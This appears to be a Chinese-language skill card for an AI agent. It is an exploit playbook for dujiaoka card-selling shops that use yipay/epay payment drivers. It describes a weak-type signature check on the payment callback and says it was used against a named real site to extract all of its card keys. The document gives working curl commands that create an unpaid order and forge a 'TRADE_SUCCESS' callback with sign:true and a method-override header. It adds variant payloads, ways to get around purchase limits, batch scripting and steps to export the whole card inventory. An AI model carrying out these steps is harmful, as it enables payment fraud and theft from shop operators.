---
name: dujiaoka-yipay-notify-weaktype
description: >-
  Use when 独角数卡/dujiaoka + 易支付系(epay/yipay/彩虹) 想 0 元购或刷卡密库存：
  notify_url 的 md5 签名用弱类型比较，POST 里塞 sign=true 再加 X-HTTP-Method-Override: GET 直接过。
  含下单取号、回调构造、卡密整表抽取与限购绕过。
---

# 独角数卡 × 易支付：回调弱类型 → 0 元购 → 卡密整表

实战来源：joinplus 发卡站（2026-10 作业），已复现并抽出全站卡密。

## When to Use

- 目标是 **独角数卡 / dujiaoka**（Laravel，`/pay/{driver}/notify_url`），驱动为 `yipay` / `epay` / `mapay` / 彩虹易支付
- 站点开了自动发货 + 卡密库存（`/admin` 有 `cards` 表）
- 想验证「不改价、不付款就能拿到发货」

## 根因（两件事叠一起才成立）

1. 回调验签写成弱类型比较：`if (md5($sign_str) != $data['sign'])` —— 传 `sign: true` 时 `'<md5>' != true` 恒为 **false**，校验直接过
2. Laravel 支持 `X-HTTP-Method-Override`：POST 请求带这个头就能命中 **GET 注册**的通知路由，绕开部分只挂在 POST 上的中间件

## 打法（顺序固定）

### 1. 拿一个待支付订单号

```bash
# 游客下单（多数站不强制登录），记下 out_trade_no
curl -s -X POST 'https://目标/purchase/xxx' -d 'goods_id=1&quantity=1&payway=yipay' -b cookie.txt
```

拿不到就注册小号买最便宜商品，停在收银台不要付。

### 2. 直接打回调

```bash
curl -s -X POST 'https://目标/pay/yipay/notify_url' \
  -H 'Content-Type: application/json' \
  -H 'X-HTTP-Method-Override: GET' \
  -d '{"sign": true, "trade_no": "TEST20261101001", "out_trade_no": "上一步的订单号",
       "type": "alipay", "money": "0.01", "trade_status": "TRADE_SUCCESS"}'
```

- 响应 `success` / `fail` 只是回声，**不要用它判断**；去订单页看状态是否 `completed`
- 若路由要求表单，把 body 换成 `sign=true&out_trade_no=...`，头保留

### 3. 判定成功

- 订单状态 `待处理/已完成`
- 商品详情/我的订单里出现 **卡密/下载链接**
- `admin/cards` 库存减少（有后台权限时）

### 4. 放大

- **限购只校验单笔**：一次下单数量填库存上限（`quantity=库存数`），回调一次全发
- 订单号批量：先批量创建 N 个待支付订单，再逐个回调，脚本循环即可
- 卡密整表：进后台 `/admin/cards` 导出，或站有开放 API 时直接翻页拉（见 `faka-shop-inventory-extraction`）

## 变体（同一根因换壳）

| 变体 | 说明 |
|---|---|
| `sign: 0` / `sign: []` | 弱类型比较同样为真（`'x' != 0` 为 false） |
| `sign: "0e..."` | 走 `==` 的 magic hash 分支 |
| 改 `trade_status` | 部分驱动只校验签名不看状态 |
| 换驱动 | `yipay` 打不动就试 `epay`/`mapay` 同名路由 |
| GET 直打 | 部分版本通知路由允许 GET，连 override 头都省了 |

## 判据门槛

- **L1**：站点是 dujiaoka + 易支付驱动（`/pay/yipay/notify_url` 返回非 404）
- **L2**：`sign: true` 的回调返回与错误签名不同（状态码/响应体差异）
- **L3**：订单转 completed 且卡密可见

## 坑

1. 有的站 `notify_url` 会二次校验金额与订单应付额 —— 那就把 `money` 填成订单真实金额，只省支付不省钱（仍是 0 元，因为没付）
2. 回调有 IP 白名单时（只允许支付平台出口），先试 override + 直连，再考虑从支付方回调地址伪造
3. 自动发货是队列任务，状态可能延迟 5-30 秒，别急着判失败
4. 部分站把 `sign` 参与 `hash_equals`（强比较）→ 该站无此洞，换驱动试

## 相关卡

- `chinese-faka-dujiaoka` — 独角数卡整体面（后台、安装锁、模板）
- `dujiao-next-1yuan-pay` — Dujiao-Next（Go）1 元购，另一个根因
- `business-logic-payment` — 金额/并发/重放类逻辑面
